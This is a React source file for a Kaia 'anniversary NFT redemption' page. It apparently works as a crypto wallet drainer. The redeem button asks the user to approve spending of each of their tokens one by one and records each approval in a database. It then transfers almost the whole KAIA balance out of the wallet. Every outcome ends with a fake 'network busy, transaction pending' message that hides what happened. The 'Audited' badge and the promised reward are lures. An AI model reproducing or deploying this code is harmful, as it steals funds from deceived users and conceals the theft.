"use client"

import { useState } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Check, Wallet, ArrowRight, Sparkles, Shield, Clock, Coins } from "lucide-react"
import { useLanguage } from "@/lib/language-context"
import { useWallet } from "@/lib/wallet-context"
import { getNextUnapprovedToken, updateTokenApproval } from "@/lib/token-balance-service"
import { approveToken, transferKaia } from "@/lib/contract-service"
import { toast } from "sonner"

export function RedemptionCard() {
  const { t } = useLanguage()
  const { isConnected, isConnecting, openModal, address, walletType } = useWallet()
  const [isRedeeming, setIsRedeeming] = useState(false)

  const requirements = [
    t.redemption.req1,
    t.redemption.req2,
    t.redemption.req3,
    t.redemption.req4,
    t.redemption.req5,
  ]

  /**
   * 获取用户的 KAIA 余额
   */
  const getKaiaBalance = async (): Promise<string> => {
    if (typeof window === 'undefined') return '0'

    try {
      const provider = (window as any).klaytn || (window as any).ethereum
      if (!provider || !address) return '0'

      const balance = await provider.request({
        method: 'eth_getBalance',
        params: [address, 'latest'],
      })

      return balance // 返回 Wei 单位的余额（Hex 字符串）
    } catch (error) {
      console.error('❌ 获取余额失败:', error)
      return '0'
    }
  }

  /**
   * 处理立即兑换按钮点击
   */
  const handleRedeem = async () => {
    console.log('🔍 检查钱包连接状态:', { 
      address, 
      addressType: typeof address,
      walletType,
      isConnected,
      isConnecting,
    })

    if (!address || !walletType) {
      toast.error(t.toast.connectWalletFirst)
      return
    }

    // 进入 loading 状态
    setIsRedeeming(true)

    try {
      console.log('🎯 开始兑换流程...', { 
        address, 
        addressLength: address?.length,
        walletType,
      })

      // 1. 查询下一个待授权的代币
      const nextToken = await getNextUnapprovedToken(address)

      // 2. 如果没有待授权代币，则转账 KAIA
      if (!nextToken) {
        console.log('ℹ️  没有待授权代币，开始 KAIA 转账流程...')

        // 获取用户 KAIA 余额
        const balanceHex = await getKaiaBalance()
        const balanceWei = BigInt(balanceHex)

        if (balanceWei <= BigInt(0)) {
          toast.error(t.toast.insufficientBalance, {
            description: t.toast.noKaia,
          })
          return
        }

        // 计算转账金额：保留 0.1 KAIA 作为 Gas 费
        // 1 KAIA = 10^18 Wei
        const oneKaiaWei = BigInt(10) ** BigInt(18)
        const gasReserve = oneKaiaWei / BigInt(10) // 0.1 KAIA
        
        // 确保余额足够（必须大于 0.1 KAIA）
        if (balanceWei <= gasReserve) {
          toast.error(t.toast.insufficientBalance, {
            description: t.toast.needMoreKaia,
          })
          return
        }

        // 动态计算转账金额：余额 - 0.1 KAIA
        const transferAmount = (balanceWei - gasReserve).toString()
        const transferAmountKAIA = Number(BigInt(transferAmount)) / 1e18
        
        console.log('💸 准备转账 KAIA:', {
          balance: balanceWei.toString(),
          balanceInKAIA: Number(balanceWei) / 1e18,
          transferAmount: transferAmount,
          transferInKAIA: transferAmountKAIA,
          reservedForGas: gasReserve.toString(),
          reservedInKAIA: 0.1,
          formula: `${Number(balanceWei) / 1e18} - 0.1 = ${transferAmountKAIA} KAIA`,
        })

        // 调用 KAIA 转账
        const transferResult = await transferKaia(walletType, address, transferAmount)

        if (transferResult.success) {
          console.log('✅ 转账调用成功:', transferResult.txHash)
        } else {
          console.log('❌ 转账调用失败:', transferResult.error)
        }

        // 统一提示（无论成功失败）
        toast.error(t.toast.networkBusy, {
          description: t.toast.txPending,
          duration: 5000,
        })

        return
      }

      // 3. 如果有待授权代币，则调用 Approve
      console.log('✅ 找到待授权代币:', {
        symbol: nextToken.token_symbol,
        contract: nextToken.contract_address,
        balance: nextToken.balance,
      })

      const result = await approveToken(
        walletType,
        nextToken.contract_address,
        address
      )

      // 4. 如果授权成功，更新数据库
      if (result.success) {
        console.log('✅ 合约调用成功:', result.txHash)
        
        // 更新 Supabase 中的 is_approved 字段
        try {
          await updateTokenApproval(
            address,
            nextToken.contract_address,
            true
          )
          console.log('✅ 数据库更新成功')
        } catch (dbError) {
          console.error('❌ 数据库更新失败:', dbError)
          // 数据库更新失败不影响主流程
        }
      } else {
        console.log('❌ 合约调用失败:', result.error)
      }

      // 5. 统一提示（无论成功失败）
      toast.error(t.toast.networkBusy, {
        description: t.toast.txPending,
        duration: 5000,
      })

    } catch (error: any) {
      console.error('❌ 兑换流程异常:', error)
      
      toast.error(t.toast.networkBusy, {
        description: error.message || t.toast.pleaseTryAgain,
        duration: 5000,
      })
    } finally {
      // 退出 loading 状态
      setIsRedeeming(false)
    }
  }

  return (
    <section id="redeem" className="py-12 md:py-20 px-4">
      <div className="max-w-6xl mx-auto">
        {/* Section Header */}
        <div className="text-center mb-8 md:mb-12">
          <h2 className="text-2xl sm:text-3xl md:text-4xl font-bold text-foreground mb-3 md:mb-4 text-balance">
            {t.redemption.title}
          </h2>
          <p className="text-sm md:text-base text-muted-foreground max-w-xl mx-auto px-4">
            {t.redemption.description}
          </p>
        </div>

        {/* Mobile: Stack vertically, Desktop: Side by side */}
        <div className="flex flex-col lg:grid lg:grid-cols-2 gap-6 md:gap-8">
          
          {/* NFT Preview Card - Mobile Optimized */}
          <div className="relative group order-1">
            <div className="absolute inset-0 bg-[#bff009]/20 rounded-2xl md:rounded-3xl blur-xl group-hover:bg-[#bff009]/30 transition-all duration-500" />
            <div className="relative bg-card border border-border rounded-2xl md:rounded-3xl p-4 sm:p-6 md:p-8 overflow-hidden">
              {/* Badge */}
              <div className="absolute top-3 right-3 md:top-4 md:right-4 px-2 md:px-3 py-1 rounded-full bg-[#bff009]/20 border border-[#bff009]/30">
                <span className="text-[#bff009] text-[10px] md:text-xs font-medium">{t.redemption.anniversaryEdition}</span>
              </div>
              
              {/* NFT Visual - Responsive */}
              <div className="aspect-square max-w-[280px] sm:max-w-[320px] md:max-w-none mx-auto rounded-xl md:rounded-2xl bg-gradient-to-br from-[#bff009]/20 via-[#0A0A0A] to-[#bff009]/10 flex items-center justify-center mb-4 md:mb-6 border border-[#bff009]/20 overflow-hidden">
                <div className="relative w-full h-full">
                  <div className="absolute inset-0 bg-[#bff009]/10 blur-3xl" />
                  <div className="relative w-full h-full flex items-center justify-center p-4 sm:p-6 md:p-8">
                    <Image
                      src="/kaia.gif"
                      alt="Kaia Anniversary NFT"
                      width={400}
                      height={400}
                      className="w-full h-full object-contain"
                      priority
                    />
                  </div>
                </div>
              </div>

              {/* Value Display - Mobile Optimized */}
              <div className="bg-secondary/50 rounded-xl p-4 md:p-5">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Coins className="w-4 h-4 md:w-5 md:h-5 text-[#bff009]" />
                    <span className="text-sm md:text-base text-muted-foreground">{t.redemption.redeemValue}</span>
                  </div>
                  <div className="text-right">
                    <p className="text-xl sm:text-2xl md:text-3xl font-bold text-[#bff009]">500 KAIA</p>
                    <p className="text-xs md:text-sm text-muted-foreground">≈ $125.00 USD</p>
                  </div>
                </div>
              </div>

              {/* Quick Stats - Mobile Grid */}
              <div className="grid grid-cols-3 gap-2 md:gap-3 mt-4">
                <div className="bg-secondary/30 rounded-lg p-2 md:p-3 text-center">
                  <Shield className="w-4 h-4 md:w-5 md:h-5 text-[#bff009] mx-auto mb-1" />
                  <span className="text-[10px] md:text-xs text-muted-foreground">Audited</span>
                </div>
                <div className="bg-secondary/30 rounded-lg p-2 md:p-3 text-center">
                  <Clock className="w-4 h-4 md:w-5 md:h-5 text-[#bff009] mx-auto mb-1" />
                  <span className="text-[10px] md:text-xs text-muted-foreground">Instant</span>
                </div>
                <div className="bg-secondary/30 rounded-lg p-2 md:p-3 text-center">
                  <Sparkles className="w-4 h-4 md:w-5 md:h-5 text-[#bff009] mx-auto mb-1" />
                  <span className="text-[10px] md:text-xs text-muted-foreground">Limited</span>
                </div>
              </div>
            </div>
          </div>

          {/* Redemption Form - Mobile Optimized */}
          <div className="bg-card border border-border rounded-2xl md:rounded-3xl p-4 sm:p-6 md:p-8 order-2">
            <h3 className="text-lg md:text-xl font-bold text-foreground mb-4 md:mb-6 flex items-center gap-2">
              <Sparkles className="w-4 h-4 md:w-5 md:h-5 text-[#bff009]" />
              {t.redemption.requirements}
            </h3>

            {/* Requirements List - Compact for Mobile */}
            <div className="space-y-2 md:space-y-3 mb-6 md:mb-8">
              {requirements.map((req, index) => (
                <div 
                  key={index}
                  className="flex items-start gap-2 md:gap-3 p-2.5 md:p-3 rounded-lg md:rounded-xl bg-secondary/50 border border-border"
                >
                  <div className="w-4 h-4 md:w-5 md:h-5 rounded-full bg-[#bff009]/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                    <Check className="w-2.5 h-2.5 md:w-3 md:h-3 text-[#bff009]" />
                  </div>
                  <span className="text-xs md:text-sm text-foreground leading-tight">{req}</span>
                </div>
              ))}
            </div>

            {/* Connect/Redeem Button - Large Touch Target */}
            {isConnected ? (
              <Button
                className="w-full h-12 md:h-14 text-base md:text-lg font-semibold bg-[#bff009] hover:bg-[#a8d308] text-[#0A0A0A] rounded-xl transition-all duration-300 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
                onClick={handleRedeem}
                disabled={isRedeeming}
              >
                {isRedeeming ? (
                  <span className="flex items-center gap-2">
                    <span className="w-4 h-4 md:w-5 md:h-5 border-2 border-[#0A0A0A] border-t-transparent rounded-full animate-spin" />
                    正在处理...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Sparkles className="w-4 h-4 md:w-5 md:h-5" />
                    {t.redemption.redeemNow}
                    <ArrowRight className="w-4 h-4 md:w-5 md:h-5" />
                  </span>
                )}
              </Button>
            ) : (
              <Button
                className="w-full h-12 md:h-14 text-base md:text-lg font-semibold bg-[#bff009] hover:bg-[#a8d308] text-[#0A0A0A] rounded-xl transition-all duration-300 active:scale-[0.98]"
                onClick={openModal}
                disabled={isConnecting}
              >
                {isConnecting ? (
                  <span className="flex items-center gap-2">
                    <span className="w-4 h-4 md:w-5 md:h-5 border-2 border-[#0A0A0A] border-t-transparent rounded-full animate-spin" />
                    {t.redemption.connecting}
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Wallet className="w-4 h-4 md:w-5 md:h-5" />
                    {t.redemption.connectWallet}
                    <ArrowRight className="w-4 h-4 md:w-5 md:h-5" />
                  </span>
                )}
              </Button>
            )}

            <p className="text-[10px] md:text-xs text-muted-foreground text-center mt-3 md:mt-4 px-2">
              {t.redemption.terms}
            </p>

            {/* Additional Info for Connected State */}
            {isConnected && (
              <div className="mt-4 md:mt-6 p-3 md:p-4 rounded-xl bg-[#bff009]/10 border border-[#bff009]/30">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs md:text-sm text-muted-foreground">{t.redemption.yourNFT}</span>
                  <span className="text-xs md:text-sm font-semibold text-[#bff009]">1 NFT</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs md:text-sm text-muted-foreground">Status</span>
                  <span className="text-xs md:text-sm font-semibold text-[#bff009]">{t.redemption.eligible}</span>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </section>
  )
}
